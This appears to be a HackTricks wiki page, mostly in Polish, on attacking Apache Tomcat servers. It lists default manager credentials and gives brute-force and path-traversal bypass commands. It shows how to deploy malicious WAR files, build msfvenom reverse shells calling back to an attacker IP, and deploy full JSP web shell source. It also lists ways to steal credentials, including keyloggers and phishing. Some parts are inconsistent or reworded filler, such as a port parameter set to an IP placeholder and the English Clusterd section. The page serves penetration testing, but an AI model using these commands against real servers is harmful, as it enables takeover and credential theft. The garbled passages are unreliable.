# Tomcat

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby móc je szybko naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Odkrywanie

* Zazwyczaj działa na **porcie 8080**
* **Wspólny błąd Tomcat:**

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## Wyliczanie

### **Identyfikacja wersji**
Aby znaleźć wersję Apache Tomcat, można wykonać prostą komendę:
```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```
To przeszuka stronę indeksu dokumentacji w poszukiwaniu terminu "Tomcat", ujawniając wersję w tagu tytułu odpowiedzi HTML.

### **Lokalizacja plików Managera**
Identyfikacja dokładnych lokalizacji katalogów **`/manager`** i **`/host-manager`** jest kluczowa, ponieważ ich nazwy mogą być zmienione. Zaleca się przeprowadzenie ataku brute-force w celu zlokalizowania tych stron.

### **Wyliczanie nazw użytkowników**
Dla wersji Tomcat starszych niż 6, istnieje możliwość wyliczenia nazw użytkowników poprzez:
```bash
msf> use auxiliary/scanner/http/tomcat_enum
```
### **Domyślne dane uwierzytelniające**
Katalog **`/manager/html`** jest szczególnie wrażliwy, ponieważ umożliwia przesyłanie i wdrażanie plików WAR, co może prowadzić do wykonania kodu. Ten katalog jest chroniony przez podstawową autoryzację HTTP, a powszechne dane uwierzytelniające to:
- admin:admin
- tomcat:tomcat
- admin:<NIC>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

Te dane uwierzytelniające można przetestować za pomocą:
```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```
Innym istotnym katalogiem jest **`/manager/status`**, który wyświetla wersję Tomcat i systemu operacyjnego, co ułatwia identyfikację podatności.

### **Atak brute force**
Aby przeprowadzić atak brute force na katalog manager, można użyć:
```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
Wraz z ustawianiem różnych parametrów w Metasploit w celu ukierunkowania na określony host.

## Powszechne podatności

### **Ujawnienie śladów hasła**
Dostęp do `/auth.jsp` może ujawnić hasło w śladzie w szczęśliwych okolicznościach.

### **Podwójne kodowanie URL**
Podatność CVE-2007-1860 w `mod_jk` umożliwia podwójne kodowanie URL w celu przechodzenia ścieżek, umożliwiając nieautoryzowany dostęp do interfejsu zarządzania za pomocą specjalnie spreparowanego adresu URL.

Aby uzyskać dostęp do interfejsu zarządzania Tomcatem, przejdź do: `pathTomcat/%252E%252E/manager/html`

### /examples
Wersje Apache Tomcat od 4.x do 7.x zawierają przykładowe skrypty, które są podatne na ujawnienie informacji i ataki typu cross-site scripting (XSS). Te skrypty, wymienione wyczerpująco, powinny być sprawdzane pod kątem nieautoryzowanego dostępu i potencjalnego wykorzystania. Znajdź [więcej informacji tutaj](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **Wykorzystanie podatności na przechodzenie ścieżek**
W niektórych [**podatnych konfiguracjach Tomcat**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/) można uzyskać dostęp do chronionych katalogów w Tomcat, używając ścieżki: `/..;/`

Na przykład, można **uzyskać dostęp do strony zarządzania Tomcatem** poprzez dostęp do: `www.vulnerable.com/lalala/..;/manager/html`

**Innym sposobem** na obejście chronionych ścieżek za pomocą tego triku jest dostęp do `http://www.vulnerable.com/;param=value/manager/html`


## RCE

Wreszcie, jeśli masz dostęp do Tomcat Web Application Manager, możesz **przesłać i wdrożyć plik .war (wykonać kod)**.

### Ograniczenia

Będziesz mógł wdrożyć plik WAR tylko jeśli masz **wystarczające uprawnienia** (role: **admin**, **manager** i **manager-script**). Szczegóły te można znaleźć w pliku _tomcat-users.xml_, zwykle zdefiniowanym w `/usr/share/tomcat9/etc/tomcat-users.xml` (różni się w zależności od wersji) (zobacz sekcję [POST](tomcat.md#post)).
```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```
### Metasploit

Metasploit jest jednym z najpopularniejszych narzędzi do testowania penetracyjnego, które jest szeroko stosowane w celu identyfikacji i wykorzystania podatności w systemach. Jest to framework, który umożliwia automatyzację procesu testowania penetracyjnego i dostarcza szeroką gamę modułów i narzędzi, które mogą być wykorzystane do atakowania różnych systemów i aplikacji.

Metasploit oferuje wiele modułów, które są specjalnie zaprojektowane do atakowania usług sieciowych, takich jak Tomcat. Moduły te mogą być wykorzystane do identyfikacji podatności, zdalnego wykonania kodu, przejęcia sesji i wielu innych ataków.

Aby użyć Metasploita w celu atakowania usługi Tomcat, należy najpierw zidentyfikować podatności wersji Tomcat, z którym się pracuje. Następnie można użyć odpowiedniego modułu Metasploita, takiego jak `exploit/multi/http/tomcat_mgr_deploy`, aby wykorzystać znane podatności i zdobyć dostęp do systemu.

Metasploit oferuje również wiele innych modułów i narzędzi, które mogą być wykorzystane do testowania penetracyjnego różnych usług sieciowych. Jest to niezwykle potężne narzędzie, które może być używane zarówno przez hakerów, jak i profesjonalistów ds. bezpieczeństwa w celu identyfikacji i zabezpieczania podatności w systemach.
```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```
### Odwrócony shell MSFVenom

1. Utwórz plik war do wdrożenia:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```
2. Prześlij plik `revshell.war` i uzyskaj do niego dostęp (`/revshell/`):

### Powiązane i odwrócone powłoki z [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)

W niektórych scenariuszach to nie działa (na przykład w przypadku starszych wersji sun)

#### Pobierz
```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```
#### Odwrócony shell

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands. 

To establish a reverse shell, the attacker needs to set up a listener on their machine and configure the target machine to connect back to it. This can be done by exploiting vulnerabilities in network services or by tricking the target into running malicious code.

Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine. This can be useful for performing various tasks, such as exploring the file system, exfiltrating data, or escalating privileges.

It is important to note that using reverse shells for unauthorized access to systems is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or authorized remote administration.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```
#### Powłoka powiązana

Bind shell to technika, która umożliwia zdalne połączenie z serwerem poprzez otwarcie portu i nasłuchiwanie na nim. Gdy atakujący nawiąże połączenie, uzyskuje pełną kontrolę nad systemem. Jest to przydatne narzędzie podczas testów penetracyjnych, które umożliwia zdalne wykonywanie poleceń na zdalnym serwerze.
```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```
### Używanie [Culsterd](https://github.com/hatRiot/clusterd)

Culsterd is a tool that can be used to exploit vulnerabilities in Apache Tomcat. It provides various modules that can be used to perform different types of attacks.

#### Installation

To install Culsterd, you can clone the repository from GitHub:

```
git clone https://github.com/hatRiot/clusterd.git
```

#### Usage

Once Culsterd is installed, you can use it to exploit vulnerabilities in Apache Tomcat. The tool provides several modules that can be used for different purposes:

- **ajp_fuzz**: This module can be used to fuzz the AJP protocol and discover potential vulnerabilities.
- **ajp_lfi**: This module can be used to exploit a Local File Inclusion (LFI) vulnerability in Apache Tomcat.
- **ajp_rce**: This module can be used to exploit a Remote Code Execution (RCE) vulnerability in Apache Tomcat.
- **ajp_shell**: This module can be used to gain a shell on the target system through the AJP protocol.
- **ajp_upload**: This module can be used to upload files to the target system through the AJP protocol.
- **ajp_webshell**: This module can be used to deploy a web shell on the target system through the AJP protocol.

To use a specific module, you can run the following command:

```
./clusterd.py <module> <options>
```

Replace `<module>` with the name of the module you want to use and `<options>` with the required options for that module.

#### Example

Here is an example of how to use the `ajp_rce` module to exploit a Remote Code Execution vulnerability in Apache Tomcat:

```
./clusterd.py ajp_rce --target <target_ip> --port <target_port> --command "<command>"
```

Replace `<target_ip>` with the IP address of the target system, `<target_port>` with the port number of the target system, and `<command>` with the command you want to execute on the target system.

#### Conclusion

Culsterd is a powerful tool that can be used to exploit vulnerabilities in Apache Tomcat. By using its various modules, you can perform different types of attacks and gain unauthorized access to the target system. However, it is important to use this tool responsibly and only on systems that you have permission to test.
```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```
### Metoda manualna - Web shell

Utwórz plik **index.jsp** o [takiej zawartości](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp):
```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```
Możesz również zainstalować to (umożliwia przesyłanie, pobieranie i wykonywanie poleceń): [http://vonloesch.de/filebrowser.html](http://vonloesch.de/filebrowser.html)

### Metoda ręczna 2

Pobierz JSP web shell, taką jak [ta](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) i utwórz plik WAR:
```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```
## POST

Nazwa pliku z danymi uwierzytelniającymi Tomcat to _tomcat-users.xml_.
```bash
find / -name tomcat-users.xml 2>/dev/null
```
Inne sposoby na zdobycie poświadczeń Tomcat:

1. **Phishing**: Wykorzystaj technikę phishingu, aby oszukać użytkowników i zdobyć ich dane logowania do Tomcat.

2. **Brute-forcing**: Próbuj różnych kombinacji nazw użytkowników i haseł, aby znaleźć poprawne poświadczenia.

3. **Słabe hasła**: Sprawdź, czy użytkownicy używają słabych haseł, takich jak "admin" lub "password".

4. **Podglądanie**: Przechwyć dane logowania, gdy użytkownicy wprowadzają je na stronie logowania Tomcat.

5. **Ataki słownikowe**: Wykorzystaj listę popularnych haseł lub słowników, aby przeprowadzić atak słownikowy na stronie logowania Tomcat.

6. **Złamanie haseł**: Wykorzystaj techniki złamania haseł, takie jak ataki brute-force, ataki słownikowe lub ataki z wykorzystaniem tablic tęczowych, aby odzyskać hasła użytkowników.

7. **Podatności aplikacji**: Wykorzystaj podatności w aplikacji Tomcat, które mogą umożliwić zdobycie poświadczeń.

8. **Przechwytywanie pakietów**: Przechwyć pakiety sieciowe, aby znaleźć dane logowania przesyłane przez użytkowników.

9. **Keylogging**: Zainstaluj keylogger na komputerze użytkownika, aby rejestrować wszystkie wprowadzane przez niego dane, w tym dane logowania do Tomcat.

10. **Spoofing**: Wykorzystaj technikę spoofingu, aby podszyć się pod prawidłową stronę logowania Tomcat i przechwycić dane logowania użytkowników.
```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```
## Inne narzędzia do skanowania Tomcat

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## Odwołania
* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)


<details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć **reklamę swojej firmy w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
